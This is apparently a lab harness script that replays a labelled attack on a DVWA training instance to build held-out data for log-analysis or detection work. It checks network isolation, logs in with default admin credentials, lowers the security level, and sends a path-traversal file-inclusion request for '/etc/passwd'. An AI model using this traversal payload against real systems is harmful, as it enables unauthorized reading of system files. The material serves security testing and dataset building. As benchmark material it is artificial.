"""Record a safe DVWA local-file-inclusion held-out probe."""

from __future__ import annotations

import json
import os
import socket
import sys
import time
from pathlib import Path

import requests

sys.path.insert(0, "/opt/v2")
EDGE = "http://edge"
ATTACKER_IP = "192.0.2.131"


def isolation() -> None:
    from background import target_url

    try:
        target_url("/", "outside-lab")
    except ValueError:
        print("non_allowlisted_service_refused=PASS")
    else:
        raise SystemExit("non_allowlisted_service_refused=FAIL")
    try:
        with socket.create_connection(("1.1.1.1", 443), timeout=2):
            raise SystemExit("external_address_unreachable=FAIL")
    except OSError:
        print("external_address_unreachable=PASS")


def attack() -> None:
    ready = Path("/replay/background-halfway")
    continuation = Path("/replay/background-continue")
    for _ in range(180000):
        if ready.exists():
            break
        time.sleep(0.05)
    else:
        raise TimeoutError("background replay did not reach its seeded pause")

    from pacing import install_hand_pacing

    install_hand_pacing(5006, scanner=False)

    headers = {"X-Lab-Client-IP": ATTACKER_IP, "User-Agent": "M8-v2-s06-lfi"}
    session = requests.Session()
    from s05 import Inputs

    login_page = session.get(f"{EDGE}/login.php", headers=headers, timeout=15)
    if login_page.status_code != 200:
        raise RuntimeError("DVWA login page did not load")
    login_fields = Inputs()
    login_fields.feed(login_page.text)
    login = session.post(
        f"{EDGE}/login.php",
        headers={**headers, "X-Lab-Step": "training_account_login"},
        data={
            "username": os.environ.get("DVWA_ADMIN_USER", "admin"),
            "password": os.environ.get("DVWA_ADMIN_PASSWORD", "password"),
            "Login": "Login",
            "user_token": login_fields.values.get("user_token", ""),
        },
        timeout=15,
        allow_redirects=True,
    )
    if login.status_code != 200 or 'name="username"' in login.text:
        raise RuntimeError("DVWA training account login failed")
    security = session.get(f"{EDGE}/security.php", headers=headers, timeout=15)
    fields = Inputs()
    fields.feed(security.text)
    response = session.post(
        f"{EDGE}/security.php",
        headers=headers,
        data={
            "security": "low",
            "seclev_submit": "Submit",
            "user_token": fields.values.get("user_token", ""),
        },
        timeout=15,
        allow_redirects=False,
    )
    if response.status_code not in {200, 302} or session.cookies.get("security") != "low":
        raise RuntimeError("DVWA low security setting could not be selected")

    included = session.get(
        f"{EDGE}/vulnerabilities/fi/",
        params={"page": "../../../../../etc/passwd"},
        headers={**headers, "X-Lab-Step": "lfi_file_read"},
        timeout=30,
        allow_redirects=False,
    )
    if included.status_code != 200 or "root:" not in included.text:
        raise RuntimeError("DVWA did not include the isolated container's passwd file")

    records = {
        "scenario_id": "s06",
        "description": (
            "A logged-in user invokes the DVWA local-file-inclusion exercise and reads a "
            "container-local system file. The successful file read is the root cause; no "
            "log poisoning, command execution, or file write is claimed."
        ),
        "attacker_ips": [ATTACKER_IP],
        "root_cause_step": "lfi_file_read",
        "steps": [
            {
                "id": "training_account_login",
                "category": "valid_account_access",
                "mitre": ["T1078"],
                "label_method": "header",
                "expected_in_timeline": False,
            },
            {
                "id": "lfi_file_read",
                "category": "local_file_inclusion",
                "mitre": ["T1005"],
                "label_method": "header",
                "expected_in_timeline": True,
            },
        ],
        "files": [],
        "analysis": {
            "access_logs": ["access.log.gz"],
            "error_logs": ["app-error.log"],
            "error_log_format": "apache",
            "error_log_utc_offset": "+0000",
            "manifest": "manifest.tsv",
            "baseline": "baseline.tsv",
            "trusted_proxies": [],
        },
        "split": "held_out",
        "expected_rule_ids": [],
    }
    Path("/replay/records.json").write_text(
        json.dumps(records, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    continuation.write_text("continue\n", encoding="ascii")
    print(json.dumps({"local_file_read_confirmed": True, "rce_claimed": False}))


if __name__ == "__main__":
    {"isolation": isolation, "attack": attack}[sys.argv[1]]()
